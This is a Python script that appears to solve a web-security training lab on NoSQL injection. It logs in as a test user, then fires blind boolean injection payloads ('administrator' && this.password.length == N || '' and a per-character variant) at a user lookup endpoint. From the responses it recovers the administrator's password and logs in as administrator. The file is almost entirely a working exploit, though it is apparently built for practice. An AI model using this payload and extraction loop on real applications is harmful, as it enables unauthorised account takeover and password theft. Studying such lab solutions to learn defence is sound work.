#################################################################################
#
# Lab: Exploiting NoSQL injection to extract data
#
# Hack Steps: 
#      1. Fetch the login page
#      2. Extract the csrf token and session cookie
#      3. Login as wiener to get a valid session
#      4. inject payload into 'user' query parametr to determine the length of
#         administrator's password based on conditional responses
#      5. Modify the payload to brute force the administrator's password
#      6. Fetch the login page
#      7. Extract the csrf token and session cookie
#      8. Login as the administrator
#      9. Fetch the administrator profile
#
#################################################################################
import requests
import re
from colorama import Fore

# Change this to your lab URL
LAB_URL = "https://0a6e00fb042683a9855fb7a600160025.web-security-academy.net"

def main():
    print("‚¶ó#‚¶ò Injection parameter: " + Fore.YELLOW + "user")
    print(Fore.WHITE + "‚¶ó1‚¶ò Fetching the login page.. ", end="", flush=True)

    login_page = fetch("/login")

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "‚¶ó2‚¶ò Extracting the csrf token and session cookie.. ", end="", flush=True)

    session = login_page.cookies.get("session")
    csrf = re.findall("csrf.+value=\"(.+)\"", login_page.text)[0]

    print(Fore.GREEN + "OK")
    print( Fore.WHITE + "‚¶ó3‚¶ò Logging in as wiener to get a valid session.. ", end="", flush=True)

    data = { "username": "wiener", "password": "peter", "csrf": csrf }
    cookies = { "session": session }
    login_as_wiener = post_data("/login", data, cookies)

    print(Fore.GREEN + "OK")

    wiener_session = login_as_wiener.cookies.get("session")

    print( Fore.WHITE + "‚¶ó4‚¶ò Determining the password length.. ")
    
    password_length = determin_password_length(wiener_session)

    print( Fore.WHITE + "‚¶ó5‚¶ò Brute forcing password.. ")
    
    admin_password = brute_force_password(password_length, wiener_session)

    print(Fore.WHITE + "\n‚¶ó6‚¶ò Fetching the login page.. ", end="", flush=True)

    login_page = fetch("/login")

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "‚¶ó7‚¶ò Extracting the csrf token and session cookie.. ", end="", flush=True)

    session = login_page.cookies.get("session")
    csrf = re.findall("csrf.+value=\"(.+)\"", login_page.text)[0]

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "‚¶ó8‚¶ò Logging in as the administrator.. ", end="", flush=True)

    data = { "username": "administrator", "password": admin_password, "csrf": csrf }
    cookies = { "session": session }
    login_as_admin = post_data("/login", data, cookies)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "‚¶ó9‚¶ò Fetching the administrator profile.. ", end="", flush=True)

    admin_session = login_as_admin.cookies.get("session")
    cookies = { "session": admin_session }
    fetch("/my-account", cookies)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "üóπ The lab should be marked now as " + Fore.GREEN + "solved")


def determin_password_length(session):
    for length in range(1, 50):
        print(Fore.WHITE + "‚ùØ‚ùØ Checking if length = " + Fore.YELLOW + str(length), flush=True, end='\r')
        
        payload = f"administrator' %26%26 this.password.length == {length} || '"        
        cookies = { "session": session }
        injection = fetch(f"/user/lookup?user={payload}", cookies)
  
        error_text = re.findall("Could not find user", injection.text)
        if len(error_text) == 0:
            print(Fore.WHITE + "‚ùØ‚ùØ Checking if length = " + Fore.YELLOW + str(length) + 
                  Fore.WHITE + " [ Correct length: " + Fore.GREEN + str(length) + Fore.WHITE + " ]")

            return length        
        else:
            continue
    
    print(Fore.RED + "‚¶ó!‚¶ò Failed to determine the length")
    exit(1)


def brute_force_password(password_length, session):
    correct_password = []

    for position in range(0, password_length):
        for character in "abcdefghijklmnopqrstuvwxyz":
            print(Fore.WHITE + "‚ùØ‚ùØ Checking if char at position " + Fore.BLUE + str(position) + 
                  Fore.WHITE + " = " + Fore.YELLOW + character, flush=True, end='\r')
            
            payload = f"administrator' %26%26 this.password[{position}] == '{character}' || '" 
            cookies = { "session": session}
            injection = fetch(f"/user/lookup?user={payload}", cookies)
            
            error_text = re.findall("Could not find user", injection.text)
            if len(error_text) == 0:
                correct_password.append(character)
                
                print(Fore.WHITE + "‚ùØ‚ùØ Checking if char at position " + Fore.BLUE + str(position) + 
                      Fore.WHITE + " = " + Fore.YELLOW + character + Fore.WHITE + " [ Correct password: " +
                      Fore.GREEN + "".join(correct_password) + Fore.WHITE + " ]", flush=True, end='\r')
                
                break
            
            else:
                continue
    
    return "".join(correct_password)


def fetch(path, cookies = None):
    try:  
        return requests.get(f"{LAB_URL}{path}", cookies=cookies, allow_redirects=False)
    except:
        print(Fore.RED + "‚¶ó!‚¶ò Failed to fetch " + path + " through exception")


def post_data(path, data, cookies):
    try:    
        return requests.post(f"{LAB_URL}{path}", data, cookies=cookies, allow_redirects=False)
    except:
        print(Fore.RED + "‚¶ó!‚¶ò Failed to post data to " + path + " through exception")
        exit(1)


if __name__ == "__main__":
    main()



